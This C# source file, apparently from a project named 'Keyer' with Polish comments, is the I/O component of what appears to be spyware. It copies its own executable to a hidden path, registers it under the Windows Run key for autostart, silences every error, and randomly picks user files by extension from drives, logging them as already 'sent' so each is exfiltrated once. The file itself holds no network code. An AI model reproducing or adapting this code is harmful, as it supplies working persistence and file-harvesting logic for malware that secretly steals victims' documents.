using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;
using System.IO;
using System.Windows.Forms;

namespace Keyer
{
    class IOManager
    {
        private RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true); //Stała na klucz autostartu

        private string name;
        private string path;
        private string log;

        public void setName(string name) //Settery i Gettery
        {
            this.name = name;
        }
        public string getName()
        {
            return this.name;
        }

        public void setPath(string path) //Settery i Gettery
        {
            this.path = path;
        }
        public string getPath()
        {
            return this.path;
        }

        public void setLog(string log) //Settery i Gettery
        {
            this.log = log;
        }
        public string getLog()
        {
            return this.log;
        }

        public Boolean checkFile() //Sprawdzanie czy plik znajduje sie już na komputerze
        {
            if (File.Exists(this.path))
            {
                return true;
            }
            return false;
        }

        public void copyFile() //Kopiowanie pliku do wyznaczonej ścieżki (path)
        {
            if (Directory.Exists(this.path))
            {
                try
                {
                    File.Copy(Application.ExecutablePath, this.path + this.name);
                }
                catch (Exception)
                {
                    //Silence
                }
            }
            else
            {
                try
                {
                    Directory.CreateDirectory(path);
                    File.Copy(Application.ExecutablePath, this.path + this.name);
                }
                catch (Exception)
                {
                    //Silence
                }
            }
        }

        public Boolean checkAutostart() //Sprawdzanie autostartu
        {
            if (key.GetValue(this.name) != null)
            {
                return true;
            }
            return false;
        }

        public void makeAutostart() //Tworzenie austostartu do wyznaczonego pliku (path + name)
        {
            try
            {
                key.SetValue(this.name, "\"" + this.path + this.name + "\"", RegistryValueKind.String);
            }
            catch (Exception)
            {
                //Silence
            }
        }

        public void deleteAutostart() //Usuwanie autostartu
        {
            key.DeleteValue(this.name, false);
        }

        public string randomFile(string dir, string ext) //(Sciezka gdzie maja byc szukane pliki, rozszerzenie szukanych plikow
        {
            List<string> files = new List<string>(); //Lista string na znalezione pliki
            List<string> directories = new List<string>(); //Lista tylko na podkatalogi głównych dysków (tablica zawiera tylko katalogi nie systemowe)
            DirectoryInfo main = new DirectoryInfo(dir);
            System.Random rnd = new Random(System.DateTime.Now.Millisecond);
                if (Directory.Exists(dir))
                {
                    try
                    {
                        directories.AddRange(Directory.GetDirectories(dir)); //Wyszukuje niechronione systemowo głównego katalogu dysku (!)

                        for (int i = 0; i < directories.Count; i++) //Pętla For na dodanie plików do listy files z każdego katalogu który nie jest katalogiem systemowym
                        {
                            if (!directories[i].Contains("$RECYCLE.BIN") && !directories[i].Contains("System Volume Information")) //Pomijanie katalogów chronionych przez system
                            {
                                files.AddRange(Directory.GetFiles(directories[i], ext, SearchOption.AllDirectories)); //Szukanie plików z podanym rozszerzeniem i dodawanie je do listy
                            }
                        }

                        if (files.Count > 0) //Losowanie pliku odbywa sie tylko wtedy kiedy jakieś w ogóle znalazło i nie powtórzyło sie w pliku z logami
                        {
                            if (File.Exists(this.path + this.log))
                            {
                            Boolean failed = false;
                            string[] lines = System.IO.File.ReadAllLines(this.path + this.log);
                                for (int i = 0;i <= files.Count;i++)
                                {
                                failed = false;
                                string rndfile = files[rnd.Next(0, files.Count)].ToString();
                                    foreach (string line in lines)
                                    {
                                        if (line == rndfile) //Jesli znajdzie plik który został już wysłany, losuje nowy plik i sprawdzanie się powtarza
                                        {
                                            failed = true;
                                            break;
                                        }
                                    }

                                    if (failed == false)
                                    {
                                        using (StreamWriter sw = File.AppendText(this.path + this.log))
                                        {
                                            sw.WriteLine(rndfile);
                                        }
                                    return rndfile;
                                    }
                                }
                                return string.Empty;
                            }
                            else
                            {
                                string rndfile = files[rnd.Next(0, files.Count)].ToString();
                                using (StreamWriter sw = File.CreateText(this.path + this.log))
                                {
                                    sw.WriteLine(rndfile);
                                }
                                return rndfile;
                            }
                        }
                        else
                        {
                            return string.Empty; //Zwracanie pustej sciężki w przypadku braku pliku
                        }
                    }
                    catch(Exception)
                    {
                        //Silence
                    }
                }
            return string.Empty; //Zwracanie pustej sciężki w przypadku błędu
        }
    }
}